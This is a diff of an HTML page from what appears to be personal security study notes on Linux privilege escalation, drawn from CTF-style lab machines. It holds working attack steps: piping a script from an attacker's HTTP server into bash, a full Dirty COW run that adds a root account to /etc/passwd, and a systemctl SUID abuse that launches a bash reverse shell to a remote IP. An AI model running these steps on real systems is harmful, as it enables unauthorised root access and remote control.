@@ -103,7 +103,7 @@
     <div class="Page__header">
         <h1><a href="../Privilege_Escalation/Linux.html">Privilege Escalation</a> <svg class="Page__header--separator" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.175 477.175"><path d="M360.73 229.075l-225.1-225.1c-5.3-5.3-13.8-5.3-19.1 0s-5.3 13.8 0 19.1l215.5 215.5-215.5 215.5c-5.3 5.3-5.3 13.8 0 19.1 2.6 2.6 6.1 4 9.5 4 3.4 0 6.9-1.3 9.5-4l225.1-225.1c5.3-5.2 5.3-13.8.1-19z"/></svg> <a href="../Privilege_Escalation/Linux.html">Linux</a></h1>
                 <span class="ModifiedDate">
-            February 16, 2021 at 12:20 AM        </span>
+            February 16, 2021 at 12:22 AM        </span>
                         <span class="EditOn">
             <a href="https://github.com/WildfootW/Security-Note/blob/master/docs/100_Privilege_Escalation/020_Linux.md" target="_blank">
                 Edit on GitHub            </a>
@@ -111,7 +111,226 @@
             </div>
 
     <div class="s-content">
-            </div>
+        <h1 id="page_Privilege_Escalation_Linux">Privilege Escalation Linux</h1>
+<div class="TableOfContentsContainer">
+    <h4 class="TableOfContentsContainer__title">Table of Contents</h4>
+    <div class="TableOfContentsContainer__content">
+        <ul class="TableOfContents">
+<li>
+<p><a href="#page_Privilege_Escalation_Linux">Privilege Escalation Linux</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_tags">tags: <code>Security</code> <code>PrivilegeEscalation</code></a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Reference">Reference</a></p>
+</li>
+<li>
+<p><a href="#page_Information_Gathering">Information Gathering</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Script">Script</a></p>
+</li>
+<li>
+<p><a href="#page_Manual">Manual</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Operating_System">Operating System</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Distribution">Distribution</a></p>
+</li>
+<li>
+<p><a href="#page_Kernel_Version">Kernel Version</a></p>
+</li>
+<li>
+<p><a href="#page_Environmental_Variables">Environmental Variables</a></p>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Users_Groups">Users / Groups</a></p>
+</li>
+<li>
+<p><a href="#page_Applications_Services_Files">Applications &amp; Services &amp; Files</a></p>
+</li>
+<li>
+<p><a href="#page_Networking">Networking</a></p>
+</li>
+<li>
+<p><a href="#page_Confidential_Information">Confidential Information</a></p>
+</li>
+<li>
+<p><a href="#page_File_Systems">File Systems</a></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p><a href="#page_Privilege_Escalation">Privilege Escalation</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_Dirty_Cow"><a href="https://dirtycow.ninja/" class="Link--external" rel="noopener noreferrer">Dirty Cow</a></a></p>
+</li>
+<li>
+<p><a href="#page_Tools">Tools</a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_GTFOBins"><a href="https://gtfobins.github.io/" class="Link--external" rel="noopener noreferrer">GTFOBins</a></a></p>
+<ul class="TableOfContents">
+<li>
+<p><a href="#page_example_systemctl">example: systemctl</a></p>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>    </div>
+</div>
+<h6 id="page_tags">tags: <code>Security</code> <code>PrivilegeEscalation</code></h6>
+<h1 id="page_Reference">Reference</h1>
+<ul>
+<li>
+<a href="https://www.rebootuser.com/?p=1623" class="Link--external" rel="noopener noreferrer">Rebootuser - Local Linux Enumeration &amp; Privilege Escalation Cheat Sheet</a>
+</li>
+<li>
+<a href="https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123" class="Link--external" rel="noopener noreferrer">linuxprivchecker.py – a Linux Privilege Escalation Check Script</a>
+</li>
+<li>
+<a href="https://github.com/mzet-/linux-exploit-suggester" class="Link--external" rel="noopener noreferrer">mzet-/linux-exploit-suggester</a>
+</li>
+<li>
+<a href="https://github.com/lucyoa/kernel-exploits" class="Link--external" rel="noopener noreferrer">lucyoa/kernel-exploits</a>
+</li>
+</ul>
+<h1 id="page_Information_Gathering">Information Gathering</h1>
+<p><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" class="Link--external" rel="noopener noreferrer">Cheat Sheet - Linux|g0tm1lk - Linux Privilege Escalation</a></p>
+<h2 id="page_Script">Script</h2>
+<pre><code>cp /opt/Privilege_Escalation/LinEnum/LinEnum.sh .
+python3 -m http.server 80
+</code></pre>
+<pre><code>hype@Valentine:~$ curl 10.10.14.2/LinEnum.sh | bash
+</code></pre>
+<h2 id="page_Manual">Manual</h2>
+<h3 id="page_Operating_System">Operating System</h3>
+<h4 id="page_Distribution">Distribution</h4>
+<pre><code>cat /etc/issue
+cat /etc/*-release
+cat /etc/lsb-release      # Debian based
+cat /etc/redhat-release   # Redhat based
+</code></pre>
+<h4 id="page_Kernel_Version">Kernel Version</h4>
+<pre><code>cat /proc/version
+uname -a
+uname -mrs
+</code></pre>
+<h4 id="page_Environmental_Variables">Environmental Variables</h4>
+<pre><code></code></pre>
+<h3 id="page_Users_Groups">Users / Groups</h3>
+<pre><code>id
+who
+</code></pre>
+<pre><code>sudo -l / sudo -ll
+# If no command is specified, list the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host. 
+www-data@jarvis:/$ sudo -l
+Matching Defaults entries for www-data on jarvis:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on jarvis:
+    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
+    
+sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
+Run the command as a user other than the default target user (usually root). The user may be either a user name or a numeric user-ID (UID) prefixed with the ‘#’ character (e.g., #0 for UID 0). 
+</code></pre>
+<p>example: in <code>lxd</code> group: create virtual machine and mount root folder</p>
+<h3 id="page_Applications_Services_Files">Applications &amp; Services &amp; Files</h3>
+<pre><code>ps aux | grep root
+ps -ef | grep root
+</code></pre>
+<pre><code>cat /etc/services
+</code></pre>
+<pre><code class="hljs bash"><span class="hljs-comment"># Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.</span>
+find / -perm -1000 -<span class="hljs-built_in">type</span> d 2&gt;/dev/null
+</code></pre>
+<pre><code class="hljs bash"><span class="hljs-comment"># SGID (chmod 2000) - run as the group, not the user who started it.</span>
+find / -perm -g=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null <span class="hljs-comment"># = -perm -2000</span>
+<span class="hljs-comment"># SUID (chmod 4000) - run as the owner, not the user who started it.</span>
+find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null <span class="hljs-comment"># = -perm -4000</span>
+
+<span class="hljs-comment"># SGID or SUID</span>
+find / -perm -g=s -o -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null
+<span class="hljs-comment"># Quicker search. Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID </span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> `locate -r <span class="hljs-string">"bin$"</span>`; <span class="hljs-keyword">do</span> find <span class="hljs-variable">$i</span> \( -perm -4000 -o -perm -2000 \) -<span class="hljs-built_in">type</span> f 2&gt;/dev/null; <span class="hljs-keyword">done</span>
+<span class="hljs-comment"># find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)</span>
+find / -perm -g=s -o -perm -4000 ! -<span class="hljs-built_in">type</span> l -maxdepth 3 -<span class="hljs-built_in">exec</span> ls -ld {} \; 2&gt;/dev/null
+</code></pre>
+<p><code>-exec ls -la {} \;</code></p>
+<h3 id="page_Networking">Networking</h3>
+<h3 id="page_Confidential_Information">Confidential Information</h3>
+<h3 id="page_File_Systems">File Systems</h3>
+<h1 id="page_Privilege_Escalation">Privilege Escalation</h1>
+<h2 id="page_Dirty_Cow"><a href="https://dirtycow.ninja/" class="Link--external" rel="noopener noreferrer">Dirty Cow</a></h2>
+<p>Race condition in mm/gup.c in the Linux kernel 2.x through 4.x before 4.8.3</p>
+<pre><code>wget https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
+hype@Valentine:~$ wget 10.10.14.2/dirtycow.c
+hype@Valentine:~$ grep gcc dirty.c 
+//   gcc -pthread dirty.c -o dirty -lcrypt
+hype@Valentine:~$ gcc -pthread dirty.c -o dirty -lcrypt
+hype@Valentine:~$ ./dirty 
+/etc/passwd successfully backed up to /tmp/passwd.bak
+Please enter the new password: 
+Complete line:
+firefart:figsoZwws4Zu6:0:0:pwned:/root:/bin/bash
+
+mmap: 7fbb000ab000
+hype@Valentine:~$ su firefart
+Password: 
+firefart@Valentine:/home/hype# id
+uid=0(firefart) gid=0(root) groups=0(root)
+</code></pre>
+<h2 id="page_Tools">Tools</h2>
+<h3 id="page_GTFOBins"><a href="https://gtfobins.github.io/" class="Link--external" rel="noopener noreferrer">GTFOBins</a></h3>
+<p>GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.</p>
+<h4 id="page_example_systemctl">example: systemctl</h4>
+<pre><code>find / -perm -4000 2&gt;/dev/null
+pepper@jarvis:/$ find / -perm -4000 -ls 2&gt;/dev/null
+...
+  1312201    172 -rwsr-x---   1 root     pepper     174520 Feb 17  2019 /bin/systemctl
+...
+</code></pre>
+<p>search systemctl in GTFOBins. It said:</p>
+<pre><code>sudo sh -c 'cp $(which systemctl) .; chmod +s ./systemctl'
+
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c &quot;id &gt; /tmp/output&quot;
+[Install]
+WantedBy=multi-user.target' &gt; $TF
+./systemctl link $TF
+./systemctl enable --now $TF
+</code></pre>
+<p>So I create a file <code>wildfootw.service</code> &amp; <code>reverse_shell.sh</code> in <code>/home/pepper</code>
+in <code>wildfootw.service</code>:</p>
+<pre><code>[Service]
+Type=oneshot
+ExecStart=/bin/bash /home/pepper/reverse_shell.sh
+[Install]
+WantedBy=multi-user.target
+</code></pre>
+<p>in <code>reverse_shell.sh</code>:</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/10.10.14.207/7779 0&gt;&amp;1
+</code></pre>
+<pre><code>systemctl link /home/pepper/wildfootw.service
+systemctl start wildfootw.service
+</code></pre>
+    </div>
 
         <nav>
         <ul class="Pager">
